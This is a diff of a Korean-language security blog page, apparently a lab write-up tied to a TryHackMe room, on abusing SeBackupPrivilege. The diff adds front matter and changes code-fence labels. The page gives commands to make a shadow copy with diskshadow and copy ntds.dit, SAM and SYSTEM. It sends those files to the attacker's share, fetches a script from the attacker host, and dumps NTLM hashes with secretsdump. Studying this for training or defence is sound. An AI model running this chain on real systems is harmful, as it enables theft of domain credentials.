@@ -1,3 +1,14 @@
+---
+layout: page
+title: SeBackupPrivilege
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
+
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 
 # SeBackupPrivilege를 이용한 시스템 파일 탈취 가이드
@@ -23,7 +34,7 @@ https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f
 
 - **목표:** 현재 사용자가 `SeBackupPrivilege` 권한을 보유하고 있는지 확인합니다.
 
-```powershell(title="현재 세션의 권한 확인")
+```powershell
 whoami /priv
 ```
 
@@ -36,7 +47,7 @@ whoami /priv
 #### **1단계: `diskshadow` 스크립트 준비**
 - 공격자 Kali에서 VSS 생성을 자동화하기 위한 `diskshadow`용 스크립트 파일을 만듭니다.
 
-```ini title="viper.dsh"
+```ini
 # 컨텍스트를 영구적, 비대화형으로 설정
 # C: 드라이브를 섀도 복사본 대상으로 추가
 # 섀도 복사본 생성
@@ -51,7 +62,7 @@ expose %viper% x:
 #### **2단계: 파일의 줄 끝 형식(line ending)을 변환
 - Unix 형식의 텍스트 파일을 DOS/Windows 형식으로 변환합니다.
 
-```ini title="Kali"
+```bash
 unix2dos viper.dsh
 ```
 
@@ -59,7 +70,7 @@ unix2dos viper.dsh
 #### **3단계: 스크립트 실행 및 파일 복사**
 - 준비한 스크립트를 타겟 시스템에 업로드하고 `diskshadow`로 실행하여, 민감한 파일들을 쓰기 가능한 위치(예: `C:\Temp`)로 복사합니다.
 
-```powershell title="타겟: 섀도 복사본 생성 및 파일 복사"
+```powershell
 powershell -c iwr -uri http://[kali_ip]/viper.dsh -o viper.dsh
 diskshadow /s viper.dsh
 robocopy /b x:\windows\ntds . ntds.dit
@@ -89,7 +100,7 @@ copy ntds.dit,sam,system \\[kali_ip]\share\
 - 복사된 `ntds.dit`, `SYSTEM`, `SAM` 파일을 공격자 머신으로 다운로드합니다.
 - `impacket-secretsdump`를 사용하여 파일로부터 모든 계정의 NTLM 해시를 추출합니다.
 
-```bash(title="공격자: secretsdump로 해시 추출")
+```bash
 # 도메인 컨트롤러에서 탈취한 경우
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 
